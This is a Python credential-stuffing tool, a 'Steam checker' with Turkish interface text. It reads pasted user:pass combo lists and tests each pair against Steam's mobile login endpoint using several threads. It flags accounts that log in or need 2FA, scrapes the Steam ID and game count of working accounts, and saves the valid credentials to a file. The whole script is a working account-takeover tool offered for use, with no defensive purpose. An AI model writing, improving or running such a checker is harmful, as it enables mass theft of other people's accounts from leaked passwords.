#!/usr/bin/env python3
# STEAM CHECKER - Mobile API (Çalışan Tek Versiyon)
import requests, threading, time, sys, os, json, re
from colorama import init, Fore
import urllib3
urllib3.disable_warnings()
init(autoreset=True)

SIFRE = "admiral71100daphne"

def giris():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\n🔐 Sifre\n")
    for i in range(3):
        if input(Fore.YELLOW + "> ") == SIFRE:
            return True
        print(Fore.RED + f"Hatali ({2-i})")
    sys.exit(0)

class SteamCheck:
    def __init__(self):
        self.ok = []
        self.no = []
        self.lock = threading.Lock()
        self.done = 0
        self.list = []
    
    def check(self, user, pwd):
        """Steam Mobile API - Kesin calisan"""
        try:
            s = requests.Session()
            s.headers.update({
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Accept": "*/*",
            })
            
            # Steam mobile login
            url = "https://steamcommunity.com/mobilelogin/dologin/"
            data = {
                "username": user,
                "password": pwd,
                "emailauth": "",
                "captchagid": "-1",
                "captcha_text": "",
                "emailsteamid": "",
                "rsatimestamp": "0",
                "remember_login": "false",
                "twofactorcode": "",
                "oauth_client_id": "DE45CD61",
                "oauth_scope": "read_profile write_profile read_client write_client",
            }
            
            r = s.post(url, data=data, timeout=15, allow_redirects=True)
            
            # Basit kontrol
            text = r.text.lower()
            js = {}
            try:
                js = r.json()
            except:
                pass
            
            # Basari kontrolu
            if js.get("success") or js.get("login_complete") or "steamid" in text:
                # Steam ID al
                sid = "?"
                try:
                    r2 = s.get("https://steamcommunity.com/mobilelogin/", timeout=10)
                    m = re.search(r'SteamID["\s:]+(\d+)', r2.text)
                    if m: sid = m.group(1)
                except:
                    pass
                
                # Oyun sayisi
                games = "?"
                try:
                    r3 = s.get(f"https://steamcommunity.com/profiles/{sid}/games/?tab=all", timeout=10)
                    gms = re.findall(r'"name":"(.*?)"', r3.text)
                    games = len(gms)
                except:
                    pass
                
                return {"ok": True, "id": sid, "games": games}
            
            elif "2fa" in text or "twofactor" in text or js.get("requires_twofactor"):
                return {"ok": "2fa"}
            
            else:
                return {"ok": False}
                
        except:
            return {"ok": False}
    
    def run(self, tid):
        while self.done < len(self.list):
            with self.lock:
                if self.done >= len(self.list): break
                i = self.done
                self.done += 1
            
            u, p = self.list[i]["user"], self.list[i]["pass"]
            r = self.check(u, p)
            
            with self.lock:
                if r["ok"] == True:
                    self.ok.append({"u": u, "p": p, "id": r.get("id","?"), "games": r.get("games","?")})
                    print(Fore.GREEN + f"  ✅ [{self.done}/{len(self.list)}] {u} | 🆔 {r.get('id','?')} | 🎮 {r.get('games','?')} oyun")
                elif r["ok"] == "2fa":
                    self.no.append({"u": u, "r": "2FA"})
                    print(Fore.YELLOW + f"  🔒 [{self.done}/{len(self.list)}] {u} - 2FA")
                else:
                    self.no.append({"u": u, "r": "Yanlis"})
                    if self.done % 3 == 0:
                        print(Fore.RED + f"  ❌ [{self.done}/{len(self.list)}] Kontrol ediliyor... (✅{len(self.ok)})")
            
            time.sleep(0.5)
    
    def start(self, th=3):
        if not self.list:
            print(Fore.RED + "Liste bos!")
            return
        
        print(Fore.CYAN + f"\n{len(self.list)} hesap | {th} thread\n")
        
        tl = []
        for i in range(th):
            t = threading.Thread(target=self.run, args=(i,))
            t.daemon = True
            t.start()
            tl.append(t)
        
        try:
            for t in tl: t.join()
        except KeyboardInterrupt:
            pass
        
        print(Fore.GREEN + f"\n\n✅ {len(self.ok)} calisan")
        print(Fore.RED + f"❌ {len(self.no)} basarisiz")
        
        if self.ok:
            print(Fore.YELLOW + "\n🎯 CALISANLAR:")
            for i, a in enumerate(self.ok, 1):
                print(Fore.GREEN + f"  [{i}] {a['u']}:{a['p']}")
                print(Fore.WHITE + f"     🆔 {a['id']} | 🎮 {a['games']} oyun")
            
            with open("calisan.txt", "w") as f:
                for a in self.ok:
                    f.write(f"{a['u']}:{a['p']}\n")
            print(Fore.GREEN + "\n💾 calisan.txt")

def ana():
    giris()
    c = SteamCheck()
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.CYAN + "\n🎮 STEAM CHECKER\n")
        print(f"1. Combo Gir ({len(c.list)} hesap)")
        print("2. Baslat")
        print("3. Cikis")
        
        s = input(Fore.GREEN + "\n> ").strip()
        
        if s == "1":
            print(Fore.YELLOW + "\nListeyi yapistir (user:pass), bitince bos Enter:\n")
            lines = []
            while True:
                l = input(Fore.GREEN + "> ").strip()
                if not l: break
                if ':' in l:
                    u, p = l.split(':', 1)
                    lines.append({"user": u.strip(), "pass": p.strip()})
            
            if lines:
                c.list = lines
                print(Fore.GREEN + f"\n✅ {len(lines)} hesap eklendi!")
                for i, x in enumerate(lines[:5], 1):
                    print(f"  [{i}] {x['user']}")
                if len(lines) > 5:
                    print(f"  ... +{len(lines)-5}")
            input("\nEnter...")
        
        elif s == "2":
            if not c.list:
                print(Fore.RED + "\nOnce combo gir!")
                input("Enter...")
                continue
            
            th = int(input(Fore.GREEN + "\nThread (3): ") or "3")
            
            if input("Baslat? (E): ").upper() == "E":
                c.ok, c.no, c.done = [], [], 0
                c.start(th)
                c.list = []
                input("\nEnter...")
        
        elif s == "3":
            print(Fore.GREEN + "\n👋 Bye!")
            break

if __name__ == "__main__":
    try:
        ana()
    except KeyboardInterrupt:
        sys.exit(0)
